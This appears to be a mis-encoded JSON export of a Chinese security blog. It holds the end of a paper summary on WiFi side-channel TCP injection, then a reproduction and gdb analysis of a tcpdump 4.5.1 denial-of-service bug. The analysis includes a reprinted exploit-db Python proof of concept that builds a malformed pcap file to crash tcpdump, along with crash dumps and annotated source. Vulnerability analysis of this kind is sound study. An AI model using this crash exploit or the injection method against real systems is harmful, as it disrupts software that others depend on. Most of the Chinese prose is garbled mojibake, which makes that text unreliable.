æ­¤å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å®é™…ä¸Šå·²ç»è¢«å»åŒæ­¥ã€‚æ”»å‡»è€…ç°åœ¨å¯ä»¥ç®€å•åœ°å‘é€æ¬ºéª—æ€§å“åº”ï¼ˆçŸ¥é“é¢„æœŸçš„åºåˆ—å·å’Œæœ‰æ•ˆçš„ACKå·ï¼‰ã€‚å¦‚æœæˆ‘ä»¬åªæƒ³æ‰§è¡Œä¸€æ¬¡æ€§æ³¨å…¥ï¼Œåªéœ€ç”¨æ¶æ„è„šæœ¬æ›¿æ¢ç¬¬ä¸€æ­¥ä¸­çš„payloadå°±è¶³å¤Ÿäº†ã€‚æ­¤å¤–ï¼Œé’ˆå¯¹Windowsçš„æ³¨å…¥æ­¥éª¤å­˜åœ¨æ›´åŠ é€šç”¨çš„æ›¿ä»£ç­–ç•¥ï¼Œä¸ä¾èµ–äºæµè§ˆå™¨è¡Œä¸ºã€‚ å…·ä½“æ¥è¯´ï¼Œç”±äºHTTPå“åº”çš„å‰å‡ ä¸ªå­—èŠ‚æ˜¯å¯é¢„å…ˆç¡®å®šçš„ï¼ˆå³HTTPï¼‰ï¼Œä¸ç ´åçœŸå®çš„å“åº”ï¼Œè€Œæ˜¯è¦†ç›–æ ‡é¢˜å’Œæ­£æ–‡ä»¥å½¢æˆåˆæ³•ä½†æ¶æ„çš„å“åº”ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨å°†å®Œå…¨å¿˜è®°æ³¨å…¥çš„å­˜åœ¨ã€‚ è¿™è¡¨æ˜ä¸€æ—¦åºåˆ—å·æ³„éœ²ï¼Œå°±å­˜åœ¨å„ç§æ–¹æ³•æ¥æœ‰æ•ˆåœ°å°†æ•°æ®æ³¨å…¥æµè§ˆå™¨ï¼Œè€Œä¸ç”¨è¿›è¡ŒåŸºäºæ—¶é—´ä¿¡é“çš„æ…¢å¾—å¤šçš„ACKå·æ¨æ–­ã€‚ Discussionæ—¶åºä¾§ä¿¡é“æ¥è‡ªæ— çº¿ç½‘ç»œçš„åŠåŒå·¥æ€§è´¨ã€‚ç”±äºæ— çº¿åè®®ä¸­å›ºæœ‰çš„å†²çªå’Œå›é€€ï¼Œå®ƒè¢«è¿›ä¸€æ­¥æ”¾å¤§ã€‚æ­£å¦‚æˆ‘ä»¬çš„æµ‹è¯•è·¯ç”±å™¨æ‰€è¯å®çš„é‚£æ ·ï¼Œç°ä»£æ— çº¿è·¯ç”±å™¨éƒ½æ”¯æŒCSMA / CAå’ŒRTS / CTSï¼Œå› ä¸ºå®ƒæ˜¯802.11æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”è¯¥åŸåˆ™ä¸å¤ªå¯èƒ½å¾ˆå¿«æ”¹å˜ã€‚è™½ç„¶ä½œè€…åªè®¨è®ºå¨èƒæ¨¡å‹ï¼Œå…¶ä¸­æ¥è‡ªå—å®³å®¢æˆ·ç«¯çš„è¿æ¥æ˜¯é’ˆå¯¹æ€§çš„ï¼Œä½†æ”»å‡»å®é™…ä¸Šä¹Ÿé€‚ç”¨äºæºè‡ªé€šè¿‡åŒä¸€æ— çº¿è·¯ç”±å™¨è¿æ¥çš„å…¶ä»–å®¢æˆ·ç«¯çš„è¿æ¥ã€‚è¿™æ˜¯å› ä¸ºæ‰€æœ‰è¿™äº›å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ï¼Œåœ¨ç›¸åŒNATä¹‹åï¼‰å…±äº«äº†ç›¸åŒçš„å†²çªåŸŸå¹¶å› æ­¤é­å—ç›¸åŒçš„å®šæ—¶ä¿¡é“ã€‚é€šè¿‡æ¢æµ‹æ•°æ®åŒ…åœ¨ä»»ä½•å®¢æˆ·ç«¯ä¸Šè§¦å‘çš„å“åº”å°†æœ‰æ•ˆåœ°å»¶è¿Ÿæ¢æµ‹åæŸ¥è¯¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå—å®³è€…è¿æ¥ï¼ˆé€šè¿‡å‚€å„¡æ‰“å¼€ï¼‰åªæ˜¯ä¸ºè¿œç¨‹æ”»å‡»è€…æä¾›äº†æµ‹é‡ç¢°æ’çš„æœºä¼šã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥æ‰©å±•å¨èƒæ¨¡å‹ä»¥è€ƒè™‘æ— çº¿è¿æ¥çš„æœåŠ¡å™¨ï¼Œä¾‹å¦‚ç‰©è”ç½‘è®¾å¤‡ã€‚å·²ç»è¯æ˜ï¼Œé€šè¿‡å…¬å…±IPåœ°å€å’Œå¼€æ”¾ç«¯å£å¯ä»¥è®¿é—®æ•°ç™¾ä¸‡ä¸ªç‰©è”ç½‘è®¾å¤‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é’ˆå¯¹æ­¤ç±»IoTè®¾å¤‡ä¸Šçš„è¿æ¥å¯åŠ¨å®Œå…¨åç¦»è·¯å¾„çš„æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œè®¡ç®—åœ¨è¿æ¥ä¸Šäº¤æ¢çš„å­—èŠ‚ï¼Œç»ˆæ­¢ä¸å¦ä¸€ä¸»æœºçš„è¿æ¥ï¼Œåœ¨æ­£åœ¨è¿›è¡Œçš„telnetè¿æ¥ä¸Šæ³¨å…¥æ¶æ„å‘½ä»¤ã€‚","categories":[{"name":"é¡¶ä¼šè®ºæ–‡","slug":"é¡¶ä¼šè®ºæ–‡","permalink":"https://cool-y.github.io/categories/é¡¶ä¼šè®ºæ–‡/"}],"tags":[{"name":"ä¾§ä¿¡é“æ”»å‡»","slug":"ä¾§ä¿¡é“æ”»å‡»","permalink":"https://cool-y.github.io/tags/ä¾§ä¿¡é“æ”»å‡»/"},{"name":"wifi","slug":"wifi","permalink":"https://cool-y.github.io/tags/wifi/"}]},{"title":"TCPDUMPæ‹’ç»æœåŠ¡æ”»å‡»æ¼æ´","slug":"TCPDUMPæ‹’ç»æœåŠ¡æ”»å‡»æ¼æ´","date":"2018-12-25T04:26:05.000Z","updated":"2021-04-10T13:48:18.517Z","comments":true,"path":"2018/12/25/TCPDUMPæ‹’ç»æœåŠ¡æ”»å‡»æ¼æ´/","link":"","permalink":"https://cool-y.github.io/2018/12/25/TCPDUMPæ‹’ç»æœåŠ¡æ”»å‡»æ¼æ´/","excerpt":"","text":"Tcpdumpä»‹ç» tcpdump æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨å‘½ä»¤è¡Œä¸‹çš„å—…æ¢å·¥å…·ã€‚å®ƒå…è®¸ç”¨æˆ·æ‹¦æˆªå’Œæ˜¾ç¤ºå‘é€æˆ–æ”¶åˆ°è¿‡ç½‘ç»œè¿æ¥åˆ°è¯¥è®¡ç®—æœºçš„TCP/IPå’Œå…¶ä»–æ•°æ®åŒ…ã€‚tcpdump é€‚ç”¨äºå¤§å¤šæ•°çš„ç±»Unixç³»ç»Ÿ æ“ä½œç³»ç»Ÿï¼šåŒ…æ‹¬Linuxã€Solarisã€BSDã€Mac OS Xã€HP-UXå’ŒAIX ç­‰ç­‰ã€‚åœ¨è¿™äº›ç³»ç»Ÿä¸­ï¼Œtcpdump éœ€è¦ä½¿ç”¨libpcapè¿™ä¸ªæ•æ‰æ•°æ®çš„åº“ã€‚å…¶åœ¨Windowsä¸‹çš„ç‰ˆæœ¬ç§°ä¸ºWinDumpï¼›å®ƒéœ€è¦WinPcapé©±åŠ¨ï¼Œç›¸å½“äºåœ¨Linuxå¹³å°ä¸‹çš„libpcap. tcpdumpèƒ½å¤Ÿåˆ†æç½‘ç»œè¡Œä¸ºï¼Œæ€§èƒ½å’Œåº”ç”¨äº§ç”Ÿæˆ–æ¥æ”¶ç½‘ç»œæµé‡ã€‚å®ƒæ”¯æŒé’ˆå¯¹ç½‘ç»œå±‚ã€åè®®ã€ä¸»æœºã€ç½‘ç»œæˆ–ç«¯å£çš„è¿‡æ»¤ï¼Œå¹¶æä¾›andã€orã€notç­‰é€»è¾‘è¯­å¥æ¥å¸®åŠ©ä½ å»æ‰æ— ç”¨çš„ä¿¡æ¯ï¼Œä»è€Œä½¿ç”¨æˆ·èƒ½å¤Ÿè¿›ä¸€æ­¥æ‰¾å‡ºé—®é¢˜çš„æ ¹æºã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨ tcpdump çš„å®ç°ç‰¹å®šç›®çš„ï¼Œä¾‹å¦‚åœ¨è·¯ç”±å™¨å’Œç½‘å…³ä¹‹é—´æ‹¦æˆªå¹¶æ˜¾ç¤ºå…¶ä»–ç”¨æˆ·æˆ–è®¡ç®—æœºé€šä¿¡ã€‚é€šè¿‡ tcpdump åˆ†æéåŠ å¯†çš„æµé‡ï¼Œå¦‚Telnetæˆ–HTTPçš„æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹ç™»å½•çš„ç”¨æˆ·åã€å¯†ç ã€ç½‘å€ã€æ­£åœ¨æµè§ˆçš„ç½‘ç«™å†…å®¹ï¼Œæˆ–ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚å› æ­¤ç³»ç»Ÿä¸­å­˜åœ¨ç½‘ç»œåˆ†æå·¥å…·ä¸»è¦ä¸æ˜¯å¯¹æœ¬æœºå®‰å…¨çš„å¨èƒï¼Œè€Œæ˜¯å¯¹ç½‘ç»œä¸Šçš„å…¶ä»–è®¡ç®—æœºçš„å®‰å…¨å­˜åœ¨å¨èƒã€‚ åˆ†æç¯å¢ƒ Ubuntu 16.04.4 LTS i686 tcpdump 4.5.1 gdb with peda æ¼æ´å¤ç°è¿™ä¸ªæ¼æ´è§¦å‘çš„åŸå› æ˜¯ï¼Œtcpdumpåœ¨å¤„ç†ç‰¹æ®Šçš„pcapåŒ…çš„æ—¶å€™ï¼Œç”±äºå¯¹æ•°æ®åŒ…ä¼ è¾“æ•°æ®é•¿åº¦æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„æ§åˆ¶ï¼Œå¯¼è‡´åœ¨è¿ç»­è¯»å–æ•°æ®åŒ…ä¸­å†…å®¹è¶…è¿‡ä¸€å®šé•¿åº¦åï¼Œä¼šè¯»å–åˆ°æ— æ•ˆçš„å†…å­˜ç©ºé—´ï¼Œä»è€Œå¯¼è‡´æ‹’ç»æœåŠ¡çš„å‘ç”Ÿã€‚å¯¹äºè¿™ä¸ªæ¼æ´ï¼Œé¦–å…ˆè¦å¯¹pcapåŒ…çš„ç»“æ„è¿›è¡Œä¸€å®šçš„åˆ†æï¼Œæ‰èƒ½å¤Ÿæœ€ååˆ†æå‡ºæ¼æ´çš„æˆå› ï¼Œä¸‹é¢å¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œå¤ç°ã€‚ ç¼–è¯‘å®‰è£…tcpdump12345678910111. # apt-get install libpcap-dev2. # dpkg -l libpcap-dev3. # wget https://www.exploit-db.com/apps/973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz4. # tar -zxvf 973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz5. # cd tcpdump-4.5.1/6. # ./configure7. # make8. # make install9. # tcpdump â€“-version tcpdump version 4.5.1 libpcap version 1.7.4 ç”Ÿæˆpayloadï¼ˆæ¥è‡ªexploit-db payloadï¼‰12345678910111213141516171819202122232425262728293031323334# Exploit Title: tcpdump 4.5.1 Access Violation Crash# Date: 31st May 2016# Exploit Author: David Silveiro# Vendor Homepage: http://www.tcpdump.org# Software Link: http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz# Version: 4.5.1# Tested on: Ubuntu 14 LTSfrom subprocess import callfrom shlex import splitfrom time import sleepdef crash(): command = &apos;tcpdump -r crash&apos; buffer = &apos;\\xd4\\xc3\\xb2\\xa1\\x02\\x00\\x04\\x00\\x00\\x00\\x00\\xf5\\xff&apos; buffer += &apos;\\x00\\x00\\x00I\\x00\\x00\\x00\\xe6\\x00\\x00\\x00\\x00\\x80\\x00&apos; buffer += &apos;\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00&lt;\\x9c7@\\xff\\x00&apos; buffer += &apos;\\x06\\xa0r\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\xec\\x00\\x01\\xe0\\x1a&apos; buffer += &quot;\\x00\\x17g+++++++\\x85\\xc9\\x03\\x00\\x00\\x00\\x10\\xa0&amp;\\x80\\x18\\&apos;&quot; buffer += &quot;xfe$\\x00\\x01\\x00\\x00@\\x0c\\x04\\x02\\x08\\n&apos;, &apos;\\x00\\x00\\x00\\x00&quot; buffer += &apos;\\x00\\x00\\x00\\x00\\x01\\x03\\x03\\x04&apos; with open(&apos;crash&apos;, &apos;w+b&apos;) as file: file.write(buffer) try: call(split(command)) print(&quot;Exploit successful! &quot;) except: print(&quot;Error: Something has gone wrong!&quot;)def main(): print(&quot;Author: David Silveiro &quot;) print(&quot; tcpdump version 4.5.1 Access Violation Crash &quot;) sleep(2) crash()if __name__ == &quot;__main__&quot;: main() å´©æºƒåˆ†æpcapåŒ…æ ¼å¼é¦–å…ˆæ¥åˆ†æä¸€ä¸‹pcapåŒ…çš„æ ¼å¼ï¼Œé¦–å…ˆæ˜¯pcapæ–‡ä»¶å¤´çš„å†…å®¹ï¼Œåœ¨.hæœ‰æ‰€å®šä¹‰ï¼Œè¿™é‡Œå°†ç»“æ„ä½“ä»¥åŠå¯¹åº”å˜é‡å«ä¹‰éƒ½åˆ—å‡ºæ¥ã€‚123456789struct pcap_file_header &#123; bpf_u_int32 magic; u_short version_major; u_short version_minor; bpf_int32 thiszone; /* gmt to local correction */ bpf_u_int32 sigfigs; /* accuracy of timestamps */ bpf_u_int32 snaplen; /* max length saved portion of each pkt */ bpf_u_int32 linktype; /* data link type (LINKTYPE_*) */&#125;; çœ‹ä¸€ä¸‹å„å­—æ®µçš„å«ä¹‰ï¼š123456789101112131415161718192021 magicï¼š 4å­—èŠ‚ pcapæ–‡ä»¶æ ‡è¯† ç›®å‰ä¸ºâ€œd4 c3 b2 a1â€ majorï¼š 2å­—èŠ‚ ä¸»ç‰ˆæœ¬å· #define PCAP_VERSION_MAJOR 2 minorï¼š 2å­—èŠ‚ æ¬¡ç‰ˆæœ¬å· #define PCAP_VERSION_MINOR 4 thiszoneï¼š4å­—èŠ‚ æ—¶åŒºä¿®æ­£ å¹¶æœªä½¿ç”¨ï¼Œç›®å‰å…¨ä¸º0 sigfigsï¼š 4å­—èŠ‚ ç²¾ç¡®æ—¶é—´æˆ³ å¹¶æœªä½¿ç”¨ï¼Œç›®å‰å…¨ä¸º0 snaplenï¼š 4å­—èŠ‚ æŠ“åŒ…æœ€å¤§é•¿åº¦ å¦‚æœè¦æŠ“å…¨ï¼Œè®¾ä¸º0x0000ffffï¼ˆ65535ï¼‰ï¼Œ tcpdump -s 0å°±æ˜¯è®¾ç½®è¿™ä¸ªå‚æ•°ï¼Œç¼ºçœä¸º68å­—èŠ‚ linktypeï¼š4å­—èŠ‚ é“¾è·¯ç±»å‹ ä¸€èˆ¬éƒ½æ˜¯1ï¼šethernetstruct pcap_pkthdr &#123; struct timeval ts; /* time stamp */ bpf_u_int32 caplen; /* length of portion present */ bpf_u_int32 len; /* length this packet (off wire) */&#125;;struct timeval &#123; long tv_sec; /* seconds (XXX should be time_t) */ suseconds_t tv_usec; /* and microseconds */&#125;; tsï¼š 8å­—èŠ‚ æŠ“åŒ…æ—¶é—´ 4å­—èŠ‚è¡¨ç¤ºç§’æ•°ï¼Œ4å­—èŠ‚è¡¨ç¤ºå¾®ç§’æ•° caplenï¼š4å­—èŠ‚ ä¿å­˜ä¸‹æ¥çš„åŒ…é•¿åº¦ï¼ˆæœ€å¤šæ˜¯snaplenï¼Œæ¯”å¦‚68å­—èŠ‚ï¼‰ lenï¼š 4å­—èŠ‚ æ•°æ®åŒ…çš„çœŸå®é•¿åº¦ï¼Œå¦‚æœæ–‡ä»¶ä¸­ä¿å­˜çš„ä¸æ˜¯å®Œæ•´æ•°æ®åŒ…ï¼Œå¯èƒ½æ¯”caplenå¤§ å…¶ä¸­lenå˜é‡æ˜¯å€¼å¾—å…³æ³¨çš„ï¼Œå› ä¸ºåœ¨crashæ–‡ä»¶ä¸­ï¼Œå¯¹åº”lenå˜é‡çš„å€¼ä¸º00 3C 9C 37è¿™æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„å€¼ï¼Œè¯»å–å‡ºæ¥å°±æ˜¯379C3C00ï¼Œæ•°éå¸¸å¤§ï¼Œå®é™…ä¸Šåœ¨wiresharkä¸­æ‰“å¼€è¿™ä¸ªcrashæ–‡ä»¶ï¼Œå°±ä¼šæŠ¥é”™ï¼Œä¼šæç¤ºè¿™ä¸ªæ•°æ®åŒ…çš„é•¿åº¦å·²ç»è¶…è¿‡äº†èŒƒå›´ï¼Œè€Œæ¢ç®—å‡ºæ¥çš„é•¿åº¦å°±æ˜¯379C3C00ï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å…³é”®ã€‚ gdbè°ƒè¯•é¦–å…ˆé€šè¿‡gdbè¿è¡Œtcpdumpï¼Œç”¨-rå‚æ•°æ‰“å¼€pocç”Ÿæˆçš„crashï¼Œtcpå´©æºƒï¼Œåˆ°è¾¾æ¼æ´è§¦å‘ä½ç½®1234567891011121314151617181920212223242526272829303132333435361. Program received signal SIGSEGV, Segmentation fault.2. [----------------------------------registers-----------------------------------]3. EAX: 0x14. EBX: 0x81e33bd --&gt; 0x05. ECX: 0x2e (&apos;.&apos;)6. EDX: 0x07. ESI: 0xbfffe201 (&apos;.&apos; &lt;repeats 14 times&gt;)8. EDI: 0xbfffe1db --&gt; 0x30303000 (&apos;&apos;)9. EBP: 0x1062110. ESP: 0xbfffe1ac --&gt; 0x8053caa (&lt;hex_and_ascii_print_with_offset+170&gt;: mov ecx,DWORD PTR [esp+0xc])11. EIP: 0x8053c6a (&lt;hex_and_ascii_print_with_offset+106&gt;: movzx edx,BYTE PTR [ebx+ebp*2+0x1])12. EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)13. [-------------------------------------code-------------------------------------]14. 0x8053c5d &lt;hex_and_ascii_print_with_offset+93&gt;: je 0x8053d40 &lt;hex_and_ascii_print_with_offset+320&gt;15. 0x8053c63 &lt;hex_and_ascii_print_with_offset+99&gt;: mov ebx,DWORD PTR [esp+0x18]16. 0x8053c67 &lt;hex_and_ascii_print_with_offset+103&gt;: sub esp,0x417. =&gt; 0x8053c6a &lt;hex_and_ascii_print_with_offset+106&gt;: movzx edx,BYTE PTR [ebx+ebp*2+0x1]18. 0x8053c6f &lt;hex_and_ascii_print_with_offset+111&gt;: movzx ecx,BYTE PTR [ebx+ebp*2]19. 0x8053c73 &lt;hex_and_ascii_print_with_offset+115&gt;: push edx20. 0x8053c74 &lt;hex_and_ascii_print_with_offset+116&gt;: mov ebx,edx21. 0x8053c76 &lt;hex_and_ascii_print_with_offset+118&gt;: mov DWORD PTR [esp+0x18],edx22. [------------------------------------stack-------------------------------------]23. 0000| 0xbfffe1ac --&gt; 0x8053caa (&lt;hex_and_ascii_print_with_offset+170&gt;: mov ecx,DWORD PTR [esp+0xc])24. 0004| 0xbfffe1b0 --&gt; 0xb7fff000 --&gt; 0x23f3c25. 0008| 0xbfffe1b4 --&gt; 0x126. 0012| 0xbfffe1b8 --&gt; 0x2f5967 (&apos;gY/&apos;)27. 0016| 0xbfffe1bc --&gt; 0x028. 0020| 0xbfffe1c0 --&gt; 0x029. 0024| 0xbfffe1c4 --&gt; 0x7ffffff930. 0028| 0xbfffe1c8 --&gt; 0x81e33bd --&gt; 0x031. [------------------------------------------------------------------------------]32. Legend: code, data, rodata, value33. Stopped reason: SIGSEGV34. hex_and_ascii_print_with_offset (ident=0x80c04af &quot;\\n\\t&quot;, cp=0x8204000 &lt;error: Cannot access memory at address 0x8204000&gt;,35. length=0xfffffff3, oset=0x20c40) at ./print-ascii.c:9136. 91 s2 = *cp++; ä»å´©æºƒä¿¡æ¯æ¥çœ‹ï¼Œå‡ºé”™ä½ç½®ä¸ºs2 = cp++;å´©æºƒåŸå› ä¸ºSIGSEGVï¼Œå³è¿›ç¨‹æ‰§è¡Œäº†ä¸€æ®µæ— æ•ˆçš„å†…å­˜å¼•ç”¨æˆ–å‘ç”Ÿæ®µé”™è¯¯ã€‚å¯ä»¥çœ‹åˆ°ï¼Œé—®é¢˜å‡ºç°åœ¨./print-ascii.c:91ï¼Œè€Œä¸”æ­¤æ—¶æŒ‡é’ˆè¯»å–[ebx+ebp2+0x1]çš„å†…å®¹ï¼Œå¯èƒ½æ˜¯è¶Šç•Œè¯»å–é€ æˆçš„å´©æºƒã€‚å†ç»“åˆæºç ä¿¡æ¯å¯çŸ¥ï¼ŒæŒ‡é’ˆcpåœ¨è‡ªåŠ çš„è¿‡ç¨‹ä¸­è®¿é—®åˆ°äº†ä¸€ä¸ªæ²¡æœ‰æƒé™è®¿é—®çš„åœ°å€ï¼Œå› ä¸ºè¿™æ˜¯å†™åœ¨ä¸€ä¸ªwhileå¾ªç¯é‡Œï¼Œä¹Ÿå°±æ˜¯æ˜¯è¯´nshortsçš„å€¼åå¤§ï¼Œå†çœ‹nshortsæ€ä¹ˆæ¥çš„ï¼Œç”±æ­¤nshorts = length / sizeof(u_short);å¯çŸ¥ï¼Œå¯èƒ½æ˜¯å‡½æ•°ä¼ å…¥çš„å‚æ•°lengthæ²¡æœ‰æ§åˆ¶å¤§å°å¯¼è‡´ï¼Œå› æ­¤ç›®æ ‡å°±æ˜¯è¿½è¸ªlengthæ˜¯å¦‚ä½•ä¼ å…¥çš„ã€‚æˆ‘ä»¬é€šè¿‡btå›æº¯ä¸€ä¸‹è°ƒç”¨æƒ…å†µã€‚123456789101112131. gdb-peda$ bt2. #0 hex_and_ascii_print_with_offset (ident=0x80c04af &quot;\\n\\t&quot;, cp=0x8204000 &lt;error: Cannot access memory at address 0x8204000&gt;,3. length=0xfffffff3, oset=0x20c40) at ./print-ascii.c:914. #1 0x08053e26 in hex_and_ascii_print (ident=0x80c04af &quot;\\n\\t&quot;, cp=0x81e33bd &quot;&quot;, length=0xfffffff3) at ./print-ascii.c:1275. #2 0x08051e7d in ieee802_15_4_if_print (ndo=0x81e1320 &lt;Gndo&gt;, h=0xbfffe40c, p=&lt;optimized out&gt;) at ./print-802_15_4.c:1806. #3 0x080a0aea in print_packet (user=0xbfffe4dc &quot; \\023\\036\\b\\300\\034\\005\\b\\001&quot;, h=0xbfffe40c, sp=0x81e33a8 &quot;@\\377&quot;)7. at ./tcpdump.c:19508. #4 0xb7fa3468 in ?? () from /usr/lib/i386-linux-gnu/libpcap.so.0.89. #5 0xb7f940e3 in pcap_loop () from /usr/lib/i386-linux-gnu/libpcap.so.0.810. #6 0x0804b3dd in main (argc=0x3, argv=0xbffff6c4) at ./tcpdump.c:156911. #7 0xb7de9637 in __libc_start_main (main=0x804a4c0 &lt;main&gt;, argc=0x3, argv=0xbffff6c4, init=0x80b1230 &lt;__libc_csu_init&gt;,12. fini=0x80b1290 &lt;__libc_csu_fini&gt;, rtld_fini=0xb7fea880 &lt;_dl_fini&gt;, stack_end=0xbffff6bc) at ../csu/libc-start.c:29113. #8 0x0804c245 in _start () å‡½æ•°è°ƒç”¨æµç¨‹1234pcap_loop |----ïƒ print_packet |-----ïƒ hex_and_ascii_print |--------ïƒ  hex_and_ascii_print_with_offset ç”±æ­¤å¯è§ï¼Œä»mainå‡½æ•°å¼€å§‹äº†ä¸€è¿ä¸²å‡½æ•°è°ƒç”¨ï¼Œgitæºç ä¸‹æ¥çœ‹çœ‹ã€‚tcpdump.cæ‰¾åˆ°pcap_loopè°ƒç”¨12345678910111213141516171. do &#123;2. status = pcap_loop(pd, cnt, callback, pcap_userdata);3. if (WFileName == NULL) &#123;4. /*5. * We&apos;re printing packets. Flush the printed output,6. * so it doesn&apos;t get intermingled with error output.7. */8. if (status == -2) &#123;9. /*10. * We got interrupted, so perhaps we didn&apos;t11. * manage to finish a line we were printing.12. * Print an extra newline, just in case.13. */14. putchar(&apos;n&apos;);15. &#125;16. (void)fflush(stdout);17. &#125; è®¾ç½®æ–­ç‚¹ä¹‹åæŸ¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°çš„æ‰§è¡Œç»“æœ pcap_loopé€šè¿‡callbackæŒ‡å‘print_packet,æ¥çœ‹ä¸€ä¸‹å®ƒçš„æºç 1234567891011121314151617181920212223241. static void2. print_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *sp)3. &#123;4. struct print_info *print_info;5. u_int hdrlen;6. ++packets_captured;7. ++infodelay;8. ts_print(&amp;h-&gt;ts);9. print_info = (struct print_info *)user;10. /*11. * Some printers want to check that they&apos;re not walking off the12. * end of the packet.13. * Rather than pass it all the way down, we set this global.14. */15. snapend = sp + h-&gt;caplen;16. if(print_info-&gt;ndo_type) &#123;17. hdrlen = (*print_info-&gt;p.ndo_printer)(print_info-&gt;ndo, h, sp);&lt;====18. &#125; else &#123;19. hdrlen = (*print_info-&gt;p.printer)(h, sp);20. &#125;21. putchar(&apos;n&apos;);22. --infodelay;23. if (infoprint)24. info(0);&#125; åŒæ ·è®¾ç½®æ–­ç‚¹çœ‹è¯¥å‡½æ•°æ˜¯å¦‚ä½•è°ƒç”¨æ‰§è¡Œçš„ è¿™æ˜¯æˆ‘ä»¬å¯ä»¥æ ¹æ®callçš„ä¿¡æ¯ï¼Œè®¡ç®—å‡ºè°ƒç”¨çš„å‡½æ•°å å…¶ä¸­(*print_info-&gt;p.ndo_printer)(print_info-&gt;ndo,h,sp)æŒ‡å‘ieee802_15_4_if_print 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767725. u_int26. ieee802_15_4_if_print(struct netdissect_options *ndo,27. const struct pcap_pkthdr *h, const u_char *p)28. &#123;29. printf(&quot;address : %x\\n&quot;,p);30. u_int caplen = h-&gt;caplen; //ä¼ å…¥çš„caplenï¼Œèµ‹å€¼ç»™æ— ç¬¦å·æ•´å½¢å˜é‡caplen,ä¸”è¯¥å€¼ä¸º831. int hdrlen;32. u_int16_t fc;33. u_int8_t seq;34. if (caplen &lt; 3) &#123; //ä¸æ»¡è¶³35. ND_PRINT((ndo, &quot;[|802.15.4] %x&quot;, caplen));36. return caplen;37. &#125;38. fc = EXTRACT_LE_16BITS(p);39. hdrlen = extract_header_length(fc);40. seq = EXTRACT_LE_8BITS(p + 2);41. p += 3;42. caplen -= 3;//æ­¤æ—¶caplen = 543. ND_PRINT((ndo,&quot;IEEE 802.15.4 %s packet &quot;, ftypes[fc &amp; 0x7]));44. if (vflag)45. ND_PRINT((ndo,&quot;seq %02x &quot;, seq));46. if (hdrlen == -1) &#123;47. ND_PRINT((ndo,&quot;malformed! &quot;));48. return caplen;49. &#125;50. if (!vflag) &#123;51. p+= hdrlen;52. caplen -= hdrlen;53. &#125; else &#123;54. u_int16_t panid = 0;55. switch ((fc &gt;&gt; 10) &amp; 0x3) &#123;56. case 0x00:57. ND_PRINT((ndo,&quot;none &quot;));58. break;59. case 0x01:60. ND_PRINT((ndo,&quot;reserved destination addressing mode&quot;));61. return 0;62. case 0x02:63. panid = EXTRACT_LE_16BITS(p);64. p += 2;65. ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));66. p += 2;67. break;68. case 0x03:69. panid = EXTRACT_LE_16BITS(p);70. p += 2;71. ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p)));72. p += 8;73. break;74. &#125;75. ND_PRINT((ndo,&quot;&lt; &quot;);76. switch ((fc &gt;&gt; 14) &amp; 0x3) &#123;77. case 0x00:78. ND_PRINT((ndo,&quot;none &quot;));79. break;80. case 0x01:81. ND_PRINT((ndo,&quot;reserved source addressing mode&quot;));82. return 0;83. case 0x02:84. if (!(fc &amp; (1 &lt;&lt; 6))) &#123;85. panid = EXTRACT_LE_16BITS(p);86. p += 2;87. &#125;88. ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));89. p += 2;90. break;91. case 0x03:92. if (!(fc &amp; (1 &lt;&lt; 6))) &#123;93. panid = EXTRACT_LE_16BITS(p);94. p += 2;95. &#125;96. ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p))));97. p += 8;98. break;99. &#125;100. caplen -= hdrlen;101. &#125; ä¼ å…¥çš„ç¬¬äºŒä¸ªå€¼æ˜¯struct pcap_pkthdr *hç»“æ„ä½“ï¼Œå‡½æ•°ä½¿ç”¨çš„å‚æ•°caplenå°±æ˜¯ç»“æ„ä½“ä¸­çš„caplenï¼Œä¸éš¾çœ‹å‡ºï¼Œcaplenè¿›è¡Œä¸€äº›åŠ å‡æ“ä½œåï¼Œæ²¡æœ‰åˆ¤æ–­æ­£è´Ÿï¼Œç›´æ¥ä¸¢ç»™äº†ä¸‹ä¸€ä¸ªå‡½æ•°ä½¿ç”¨ã€‚ç›´æ¥è·Ÿè¿›å‡½æ•°ï¼Œçœ‹çœ‹æœ€åèµ‹å€¼æƒ…å†µ ä»æºç 